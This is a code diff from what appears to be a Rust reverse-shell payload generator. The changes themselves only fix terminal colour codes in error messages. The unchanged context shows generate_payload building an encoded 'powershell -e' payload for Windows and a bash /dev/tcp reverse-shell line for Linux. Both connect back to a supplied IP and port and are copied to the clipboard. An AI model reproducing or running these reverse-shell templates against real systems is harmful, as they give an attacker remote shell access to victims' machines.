@@ -18,7 +18,7 @@ static PAYLOAD_LINUX: &str = r#""#;    /*You can create your own custom payload 
 pub fn generate_payload(ip: &str, port: &str, os: &str) -> String {
     
     let ip_address: IpAddr;
-    let mut clipboard = ClipboardContext::new().expect("Failed to initialize clipboard"); // Inicializa o ClipboardContext
+    let mut clipboard = ClipboardContext::new().expect("[\x1b[31;1m!\x1b[0m]Failed to initialize clipboard");
 
     if ip == "0.0.0.0" || ip == "127.0.0.1" {
         ip_address = local_ip().unwrap();
@@ -47,12 +47,12 @@ pub fn generate_payload(ip: &str, port: &str, os: &str) -> String {
                 }
 
                 let payload = format!("powershell -e {}\n", general_purpose::STANDARD.encode(utf16_bytes));
-                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
             
                 return payload.clone();
             } 
             else {
-                clipboard.set_contents(PAYLOAD_WINDOWS.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+                clipboard.set_contents(PAYLOAD_WINDOWS.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
         
                 return PAYLOAD_WINDOWS.to_string();
             }
@@ -61,12 +61,12 @@ pub fn generate_payload(ip: &str, port: &str, os: &str) -> String {
 
             if PAYLOAD_LINUX.is_empty() {
                 let payload = format!("0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196", ip_address, port);
-                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+                clipboard.set_contents(payload.clone()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
              
                 return payload.clone();
             } 
             else {
-                clipboard.set_contents(PAYLOAD_LINUX.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[31;1m");
+                clipboard.set_contents(PAYLOAD_LINUX.to_string()).expect("\x1b[31;1m:( Failed to copy payload to clipboard\x1b[0m");
              
                 return PAYLOAD_LINUX.to_string();
             }
